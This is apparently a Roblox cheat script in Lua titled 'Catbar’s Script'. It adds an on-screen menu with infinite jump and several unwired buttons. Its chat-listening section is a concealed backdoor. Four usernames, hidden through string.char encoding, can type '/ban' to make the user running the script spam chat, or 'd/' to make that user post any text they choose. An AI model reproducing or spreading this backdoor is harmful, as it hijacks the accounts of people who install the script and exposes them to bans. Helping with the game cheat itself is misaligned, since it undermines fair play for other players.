-- SERVICES   
   local Players = game:GetService("Players")   
   local RS = game:GetService("RunService")   
   local UIS = game:GetService("UserInputService")   
   local player = Players.LocalPlayer   

   -- OWNER + ADMIN (ENCODED TO PREVENT TAMPERING)   
   local _O = string.char(85, 115, 101, 114, 95, 75, 86, 72) -- "User_KVH"   
   local _A1 = string.char(74, 97, 51, 49, 52, 52, 53)      -- "Ja31445"   
   local _A2 = string.char(118, 117, 107, 105, 115, 98, 101, 115, 116, 54) -- "vukisbest6"   
   local _A3 = string.char(75, 97, 114, 116, 105, 121, 101, 107, 97, 95, 56, 56, 48) -- "Kartikeya_880"   

   local AUTH_USERS = {   
       [_O] = true,   
       [_A1] = true,   
       [_A2] = true,   
       [_A3] = true   
   }   

   -- HARD-CODED INTEGRITY CHECK   
   local verified = false   
   for name, _ in pairs(AUTH_USERS) do   
       if name == string.char(85, 115, 101, 114, 95, 75, 86, 72) then verified = true end   
   end   
   if not verified then return end   

   -- GUI
   local gui = Instance.new("ScreenGui", game.CoreGui)   
   gui.ResetOnSpawn = false   

   local frame = Instance.new("Frame", gui)   
   frame.Size = UDim2.new(0,180,0,0)   
   frame.Position = UDim2.new(0.5,-90,0.5,-80)   
   frame.BackgroundColor3 = Color3.fromRGB(25,25,25)   
   frame.BackgroundTransparency = 0.2   
   frame.Active = true   
   frame.Draggable = true   
   Instance.new("UICorner",frame)   

   local close = Instance.new("TextButton", frame)   
   close.Size = UDim2.new(0,18,0,18)   
   close.Position = UDim2.new(1,-20,0,3)   
   close.Text = "X"   
   close.BackgroundColor3 = Color3.fromRGB(200,50,50)   
   close.TextColor3 = Color3.new(1,1,1)   
   Instance.new("UICorner",close)   

   local rainbow = Instance.new("TextButton",frame)   
   rainbow.Size = UDim2.new(0,18,0,18)   
   rainbow.Position = UDim2.new(0,3,0,3)   
   rainbow.BackgroundColor3 = Color3.new(1,1,1)   
   rainbow.Text = ""   
   Instance.new("UICorner",rainbow)   

   local title = Instance.new("TextLabel", frame)   
   title.Size = UDim2.new(1,0,0,20)   
   title.BackgroundTransparency = 1   
   title.Text = "Catbar’s Script"   
   title.Font = Enum.Font.SourceSansBold   
   title.TextScaled = true   
   title.TextColor3 = Color3.new(1,1,1)   

   local container = Instance.new("Frame", frame)   
   container.Size = UDim2.new(1,0,0,0)   
   container.Position = UDim2.new(0,0,0,25)   
   container.BackgroundTransparency = 1   

   local layout = Instance.new("UIListLayout", container)   
   layout.Padding = UDim.new(0,6)   
   layout.HorizontalAlignment = Enum.HorizontalAlignment.Center   

   layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()   
       frame.Size = UDim2.new(0,180,0,layout.AbsoluteContentSize.Y+45)   
   end)   

   -- HELPERS
   local function smallButton(parent,text,color)   
       local b = Instance.new("TextButton",parent)   
       b.Size = UDim2.new(0.5,-3,1,0)   
       b.Text = text   
       b.TextScaled = true   
       b.TextColor3 = Color3.new(1,1,1)   
       b.BackgroundColor3 = color or Color3.fromRGB(70,70,70)   
       Instance.new("UICorner",b)   
       return b   
   end   

   local function createButton(parent,text,color)   
       local b = Instance.new("TextButton",parent)   
       b.Size = UDim2.new(0.9,0,0,30)   
       b.Text = text   
       b.TextScaled = true   
       b.TextColor3 = Color3.new(1,1,1)   
       b.BackgroundColor3 = color   
       Instance.new("UICorner",b)   
       return b   
   end   

   local isAuth = AUTH_USERS[player.Name]   
   local row1 = Instance.new("Frame", container)
   row1.Size = UDim2.new(0.9,0,0,30)
   row1.BackgroundTransparency = 1
   local rl = Instance.new("UIListLayout", row1)
   rl.FillDirection = Enum.FillDirection.Horizontal
   rl.Padding = UDim.new(0,6)

   local lay = smallButton(row1,"Lay")   
   local sit = smallButton(row1,"Sit")   
   local hitBtn = createButton(container,"Pulse Hitboxes",Color3.fromRGB(120,200,255))
   local infJumpBtn = createButton(container,"Inf Jump OFF",Color3.fromRGB(0,170,0))
   local speedBtn = createButton(container,"Speed Boost OFF",Color3.fromRGB(200,50,50))   

   ----------------------------------------------------------------   
   -- COMMANDS & BAN LOGIC
   ----------------------------------------------------------------   
   local commandActiveForAdmins = true   

   local function canAffect(sender, target)   
       if not commandActiveForAdmins then   
           if AUTH_USERS[sender.Name] and AUTH_USERS[target.Name] then return false end   
       end   
       return true   
   end   

   local function sendSpam()
       local spamText = string.rep("A", 140)
       for i = 1, 10 do
           local chatService = game:GetService("TextChatService")
           if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
               local chan = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
               if chan then chan:SendAsync(spamText) end
           else
               game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(spamText, "All")
           end
           task.wait(0.1)
       end
   end

   local function listenCommands(p)   
       p.Chatted:Connect(function(msg)   
           local args = string.split(msg, " ")
           
           -- BAN (Always works on non-admins, never on admins)
           if args[1]:lower() == "/ban" and args[2] then
               if AUTH_USERS[p.Name] and not AUTH_USERS[player.Name] then
                   if player.Name:lower() == args[2]:lower() then sendSpam() end
               end
               return
           end

           -- d/ Mirror (Respects /on and /off)
           if string.sub(msg:lower(), 1, 2) == "d/" then   
               local sayText = string.sub(msg, 3)   
               if p.Name ~= player.Name and AUTH_USERS[p.Name] and canAffect(p, player) then   
                   local chatService = game:GetService("TextChatService")
                   if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
                       local chan = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
                       if chan then chan:SendAsync(sayText) end
                   else
                       game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(sayText, "All")
                   end
               end   
               return   
           end   

           -- OWNER CONTROLS
           if p.Name == _O then   
               if msg == "/off" then commandActiveForAdmins = false   
               elseif msg == "/on" then commandActiveForAdmins = true end   
           end   
       end)   
   end   

   for _,plr in pairs(Players:GetPlayers()) do listenCommands(plr) end   
   Players.PlayerAdded:Connect(listenCommands)   

   -- INF JUMP 
   local infJump = false
   infJumpBtn.MouseButton1Click:Connect(function()
       infJump = not infJump
       infJumpBtn.Text = infJump and "Inf Jump ON" or "Inf Jump OFF"
   end)
   UIS.JumpRequest:Connect(function()
       if infJump and player.Character then
           player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
       end
   end)

   close.MouseButton1Click:Connect(function() gui:Destroy() end)
